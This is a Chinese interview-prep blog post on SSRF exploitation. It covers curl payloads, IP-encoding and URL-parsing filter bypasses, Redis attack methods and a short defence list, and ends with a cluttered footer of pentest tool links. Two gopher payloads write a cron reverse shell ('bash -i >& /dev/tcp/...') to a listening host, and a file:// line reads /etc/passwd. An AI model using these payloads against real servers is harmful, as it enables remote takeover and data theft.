
--- 
title:  【网络安全工程师面试】—SSRF服务端请求伪造漏洞及利用方法 
tags: []
categories: [] 

---
**目录**















































## 4.4. SSRF

### 4.4.1. 简介

服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的内部系统。

#### 4.4.1.1. 漏洞危害

SSRF可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File协议读取本地文件。

内网服务防御相对外网服务来说一般会较弱，甚至部分内网服务为了运维方便并没有对内网的访问设置权限验证，所以存在SSRF时，通常会造成较大的危害。

### 4.4.2. 利用方式

SSRF利用存在多种形式以及不同的场景，针对不同场景可以使用不同的利用和绕过方式。

以curl为例, 可以使用dict协议操作Redis、file协议读文件、gopher协议反弹Shell等功能，常见的Payload如下：

```
curl -vvv 'dict://127.0.0.1:6379/info'

curl -vvv 'file:///etc/passwd'

# * 注意: 链接使用单引号，避免$变量问题

curl -vvv 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/103.21.140.84/6789 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a'
```

### 4.4.3. 相关危险函数

SSRF涉及到的危险函数主要是网络访问，支持伪协议的网络读取。以PHP为例，涉及到的函数有

```
file_get_contents() / fsockopen() / curl_exec() 等。
```

### 4.4.4. 过滤绕过

#### 4.4.4.1. 更改IP地址写法

一些开发者会通过对传过来的URL参数进行正则匹配的方式来过滤掉内网IP，如采用如下正则表达式：

>  
 - `^10(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){3}$`- `^172\.([1][6-9]|[2]\d|3[01])(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$`- `^192\.168(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$` 


对于这种过滤我们采用改编IP的写法的方式进行绕过，例如192.168.0.1这个IP地址可以被改写成：

>  
 - 8进制格式：0300.0250.0.1- 16进制格式：0xC0.0xA8.0.1- 10进制整数格式：3232235521- 16进制整数格式：0xC0A80001- 合并后两位：1.1.278 / 1.1.755- 合并后三位：1.278 / 1.755 / 3.14159267 


另外IP中的每一位，各个进制可以混用。

访问改写后的IP地址时，Apache会报400 Bad Request，但Nginx、MySQL

等其他服务仍能正常工作。

另外，0.0.0.0这个IP可以直接访问到本地，也通常被正则过滤遗漏。

#### 4.4.4.2. 使用解析到内网的域名

如果服务端没有先解析IP再过滤内网地址，我们就可以使用localhost等解析到内网的域名。

另外 `xip.io` 提供了一个方便的服务，这个网站的子域名会解析到对应的IP，

例如192.168.0.1.xip.io，解析到192.168.0.1。

#### 4.4.4.3. 利用解析URL所出现的问题

在某些情况下，后端程序可能会对访问的URL进行解析，对解析出来的host地址进行过滤。

这时候可能会出现对URL参数解析不当，导致可以绕过过滤。

比如 `http://www.baidu.com@192.168.0.1/` 当后端程序通过不正确的正则表达式

（比如将http之后到com为止的字符内容，也就是www.baidu.com，

认为是访问请求的host地址时）对上述URL的内容进行解析的时候，

很有可能会认为访问URL的host为www.baidu.com，而实际上这个URL所请求的内容

都是192.168.0.1上的内容。

#### 4.4.4.4. 利用跳转

如果后端服务器在接收到参数后，正确的解析了URL的host，并且进行了过滤，

我们这个时候可以使用跳转的方式来进行绕过。

可以使用如  等服务跳转，

但是由于URL中包含了192.168.0.1这种内网IP地址，可能会被正则表达式过滤掉，

可以通过短地址的方式来绕过。

常用的跳转有302跳转和307跳转，区别在于307跳转会转发POST请求中的数据等，但

是302跳转不会。

#### 4.4.4.5. 通过各种非HTTP协议

如果服务器端程序对访问URL所采用的协议进行验证的话，可以通过非HTTP协议来进行利用。

比如通过gopher，可以在一个url参数中构造POST或者GET请求，从而达到

攻击内网应用的目的。例如可以使用gopher协议对与内网的Redis服务进行攻击，

可以使用如下的URL：

>  
 <pre>gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1* * * * bash -i &gt;&amp; /dev/tcp/172.19.23.228/23330&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a
</pre> 


```
Apache Hadoop远程命令执行
axis2-admin部署Server命令执行
Confluence SSRF
counchdb WEB API远程命令执行
dict
docker API远程命令执行
Elasticsearch引擎Groovy脚本命令执行
ftp / ftps（FTP爆破）
glassfish任意文件读取和war文件部署间接命令执行
gopher
HFS远程命令执行
http、https
imap/imaps/pop3/pop3s/smtp/smtps（爆破邮件用户名密码）
Java调试接口命令执行
JBOSS远程Invoker war命令执行
Jenkins Scripts接口命令执行
ldap
mongodb
php_fpm/fastcgi 命令执行
rtsp - smb/smbs（连接SMB）
sftp
ShellShock 命令执行
Struts2 命令执行
telnet
tftp（UDP协议扩展）
tomcat命令执行
WebDav PUT上传任意文件
WebSphere Admin可部署war间接命令执行
zentoPMS远程命令执行
```

#### 4.4.4.7. 利用IPv6

#### 4.4.5.1. 内网服务
<li> <pre><code>Apache Hadoop远程命令执行
axis2-admin部署Server命令执行
Confluence SSRF
counchdb WEB API远程命令执行
dict
docker API远程命令执行
Elasticsearch引擎Groovy脚本命令执行
ftp / ftps（FTP爆破）
glassfish任意文件读取和war文件部署间接命令执行
gopher
HFS远程命令执行
http、https
imap/imaps/pop3/pop3s/smtp/smtps（爆破邮件用户名密码）
Java调试接口命令执行
JBOSS远程Invoker war命令执行
Jenkins Scripts接口命令执行
ldap
mongodb
php_fpm/fastcgi 命令执行
rtsp - smb/smbs（连接SMB）
sftp
ShellShock 命令执行
Struts2 命令执行
telnet
tftp（UDP协议扩展）
tomcat命令执行
WebDav PUT上传任意文件
WebSphere Admin可部署war间接命令执行
zentoPMS远程命令执行</code></pre>  </li>
#### 4.4.5.2. Redis利用

>  
 - 写ssh公钥- 写crontab- 写WebShell- Windows写启动项- 主从复制加载 .so 文件- 主从复制写无损文件 


#### 4.4.5.3. 云主机

在AWS、Google等云环境下，通过访问云环境的元数据API或管理API，

在部分情况下可以实现敏感信息等效果。

### 4.4.6. 防御方式

>  
 - 过滤返回的信息- 统一错误信息- 限制请求的端口- 禁止不常用的协议- 对DNS Rebinding，考虑使用DNS缓存或者Host白名单 




###  推荐阅读

#### 【资源推荐】
-  <h4 id="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%93%E7%94%A8%E7%B3%BB%E7%BB%9F">**渗透测试专用系统**</h4> - kali-linux-e17-2019.1a-amd64.iso镜像- - kali-linux-2018.4-amd64- - manjaro-xfce-17.1.7-stable-x86_64.iso镜像- - WiFi专用渗透系统 nst-32-11992.x86_64.iso- - Parrot-security-4.1_amd64.iso 镜像- - manjaro-xfce-17.1.7-stable-x86_64 操作系统- - cyborg-hawk-linux-v-1.1 系统- -  <h4 id="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9B%B8%E5%85%B3%E5%B7%A5%E5%85%B7">渗透测试相关工具</h4> - **<strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>**</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong>- 【kali常用工具】上网行为工具       - - 【kali常用工具】抓包工具Charles Windows64位 免费版- - <li>【kali常用工具】brutecrack工具[WIFIPR中文版]  wpa/wpa2字典- - 【kali常用工具】EWSA 5.1.282-破包工具- - 【kali常用工具】无线信号搜索工具_kali更新- - 【kali常用工具】inssider信号测试软件_kali常用工具- - 【kali常用工具】MAC地址修改工具 保护终端不暴露- - 【kali常用工具】脚本管理工具 php和jsp页面 接收命令参数 在服务器端执行- 
#### 渗透测试相关工具
- **Java实现照片GPS定位【完整脚本】**- - **Python实现照片GPS定位【完整脚本】**- - **女神忘记相册密码 python20行代码打开【完整脚本】**- - **<strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>**</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong>- 
**python实战**
- **<strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>**</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong>**<strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>**</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong>- **<strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>**</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong>- **<strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>**</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong>- **<strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>**</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong>**<strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>**</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong>**<strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>**</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong>
<img alt="" height="625" src="https://img-blog.csdnimg.cn/20210607120133619.jpeg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjM1MDIxMg==,size_16,color_FFFFFF,t_70" width="351">​​
